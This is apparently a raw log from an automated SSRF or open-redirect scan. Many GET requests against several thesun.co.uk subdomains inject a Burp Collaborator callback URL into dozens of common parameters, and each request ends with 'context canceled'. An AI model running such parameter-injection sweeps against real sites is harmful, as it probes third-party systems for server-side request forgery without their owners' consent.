2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?c=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?excerpt=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?title=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?t=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?mode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?order=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?charset=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?token=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?file=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?code=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?token=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?submit=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?content=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?description=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?password=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?mode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?action=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?title=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?status=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?state=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?username=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?name=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?message=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?charset=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?debug=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?url=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?step=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?delete=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?post=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?comment=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?p=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?s=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?id=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?key=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?start=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?type=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?search=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?t=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?excerpt=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?email=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?lang=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?user=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?login=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?data=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?ajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?page=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?order=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?q=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://chpproxy.thesun.co.uk?c=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?debug=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?step=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?url=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?start=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?user=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?file=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?description=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?name=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?submit=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?action=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?id=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?login=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?search=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?q=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?status=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?mode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?data=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?page=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?post=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?content=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?p=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?t=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?state=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?c=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?delete=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?token=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?type=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?message=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?excerpt=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?username=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?key=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?password=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?lang=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?code=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?s=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?order=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?email=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?comment=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?charset=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?title=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://cricketpredictor.thesun.co.uk?ajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?type=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?t=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?c=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?login=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?lang=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?user=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?page=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?username=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?content=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?s=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?mode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?post=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?ajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?url=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?token=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?debug=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?start=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?submit=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?password=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?data=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?key=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?order=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?charset=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?status=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?search=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?action=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?description=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?file=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?comment=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?name=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?excerpt=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?message=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?email=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?title=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?code=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?step=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?delete=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?p=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?q=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?id=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "http://coolcruisescomp.thesun.co.uk?state=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
